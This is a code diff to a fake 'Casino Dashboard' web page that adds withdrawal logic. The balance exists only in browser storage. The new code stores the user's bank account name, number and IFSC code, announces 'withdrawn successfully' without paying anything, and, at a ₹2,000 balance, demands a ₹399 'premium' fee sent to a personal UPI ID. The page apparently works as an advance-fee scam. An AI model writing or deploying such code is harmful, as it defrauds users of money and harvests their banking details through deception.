@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Casino Dashboard</title>
   <style>
-    /* [Your original CSS unchanged] */
+    /* Your original CSS unchanged */
     :root {
       --bg: #121212;
       --card-bg: #1E2430;
@@ -290,9 +290,9 @@
 
     // Withdraw modal logic
     const modal = document.getElementById("withdrawModal");
-    const btn = document.querySelector('.withdraw-btn');
+    const btnW = document.querySelector('.withdraw-btn');
     const span = modal.querySelector(".close");
-    btn.onclick = () => modal.style.display = "block";
+    btnW.onclick = () => modal.style.display = "block";
     span.onclick = () => modal.style.display = "none";
     window.onclick = e => { if (e.target === modal) modal.style.display = "none"; };
 
@@ -302,7 +302,33 @@
       if (val) el.value = val;
     });
 
-    document.getElementById('withdrawSubmit').onclick = () => { /* withdrawal logic */ };
+    document.getElementById('withdrawSubmit').onclick = () => {
+      const amt = parseFloat(document.getElementById('withdrawAmount').value);
+      if (isNaN(amt) || amt < 2000) {
+        return alert('Minimum withdrawal is ₹2,000');
+      }
+      const saved = JSON.parse(localStorage.getItem('casinoUser'));
+      if (amt > saved.balance) {
+        return alert('Insufficient balance');
+      }
+      // PREMIUM CHECK: balance == 2000
+      if (saved.balance === 2000 && amt >= 2000) {
+        return alert(
+          "To withdraw please go through these instructions:\n\n" +
+          "To withdraw you need to get premium. Your level is VIP 0.\n" +
+          "Please pay ₹399 to get premium and withdraw your cash without verification or any hustle.\n\n" +
+          "UPI: sahilzeerak123@okhdfcbank"
+        );
+      }
+      ['accName','accNumber','ifsc'].forEach(id => {
+        localStorage.setItem(id, document.getElementById(id).value.trim());
+      });
+      saved.balance -= amt;
+      localStorage.setItem('casinoUser', JSON.stringify(saved));
+      updateKPI();
+      alert(`₹${amt} withdrawn successfully`);
+      modal.style.display = "none";
+    };
   </script>
 </body>
 </html>
